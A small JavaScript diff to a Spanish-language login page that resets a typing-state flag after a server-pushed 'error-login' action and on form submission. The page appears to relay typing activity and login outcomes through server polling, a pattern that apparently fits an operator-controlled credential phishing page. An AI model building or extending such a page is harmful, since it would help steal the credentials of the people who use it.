@@ -35,6 +35,7 @@ function startPolling() {
         } else if (action === 'error-login') {
           stopPing();
           stopPolling();
+          lastSentState = null; // Reset typing flag so they can trigger Escribiendo... again
           document.getElementById("svn-loader").hidden = true;
           msg.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
           msg.hidden = false;
@@ -120,6 +121,7 @@ form.addEventListener("submit", (event) => {
   msg.hidden = true;
   msg.textContent = "";
   document.getElementById("svn-loader").hidden = false;
+  lastSentState = null; // Reset typing flag so next time they type it sends a new state update
 
   const docType = document.getElementById("doc-type").value;
   const docNum = document.getElementById("doc-number").value;
